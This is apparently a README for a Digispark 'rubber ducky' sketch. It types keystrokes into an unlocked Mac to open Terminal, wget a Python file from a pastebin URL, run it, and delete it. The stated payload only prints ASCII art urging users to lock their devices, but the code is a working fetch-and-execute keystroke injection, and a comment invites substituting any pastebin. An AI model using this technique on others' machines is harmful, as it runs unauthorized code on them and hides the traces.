# Warning

This rubber ducky script allows you to warn a user that they should not leave their laptop/desktop unlocked. 

### Warning.ino

```csharp
#include "DigiKeyboard.h"
#define MOD_CMD_LEFT 0x00000008 //marks the keyboard location for the Command key

boolean hack = true;

void setup() {
  // put your setup code here, to run once:
}

void loop() {
  // put your main code here, to run repeatedly:
  if (hack == true){
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_CMD_LEFT); //Command + Space
    DigiKeyboard.delay(500); //5 milisecond delay
    DigiKeyboard.print("Terminal"); //Opens the Terminal
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); 
    DigiKeyboard.delay(500);
    DigiKeyboard.print("wget https://pastebin.com/raw/Y2ub39PW"); //Enter your own Pastebin
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1500);
    DigiKeyboard.print("python Y2ub39PW"); //runs the python file
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);
    DigiKeyboard.print("rm Y2ub39PW"); //removes the python file
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    hack = false; //Changes the boolean to false
  }
}
```

This script run a python script that outputs ascii art warning the user to make sure they lock their devices when they walk away. This is the output of the python script:

```csharp
         _________        .---\"\"\"      \"\"\"---.
        :______.-':      :  .--------------.  :             
        | ______  |      | :                : |             
        |:______B:|      | |                | |             
        |:______B:|      | |                | |             
        |:______B:|      | |     WARNING    | |             
        |         |      | |                | |             
        |:_____:  |      | |                | |             
        |    ==   |      | :                : |             
        |       O |      :  '--------------'  :             
        |       o |      :'---...______...---'
        |       o |-._.-i___/'             \._
        |'-.____o_|   '-.   '-...______...-'  `-._          
        :_________:      `.____________________   `-.___.-. 
                         .'.eeeeeeeeeeeeeeeeee.'.      :___:
                       .'.eeeeeeeeeeeeeeeeeeeeee.'.         
                      :____________________________:
                  Don't leave your computer unsupervised
```

